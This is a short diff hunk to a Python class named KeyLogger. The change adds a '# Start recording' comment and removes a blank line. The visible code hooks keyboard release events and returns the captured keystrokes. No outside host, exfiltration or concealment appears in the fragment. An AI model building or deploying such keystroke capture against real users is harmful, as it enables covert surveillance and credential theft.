@@ -35,7 +35,7 @@ class KeyLogger(threading.Thread):
         return last_keystrokes.encode()
 
     def run(self):
+        # Start recording
         keyboard.on_release(callback=self.callback)
-        
         keyboard.wait()
 
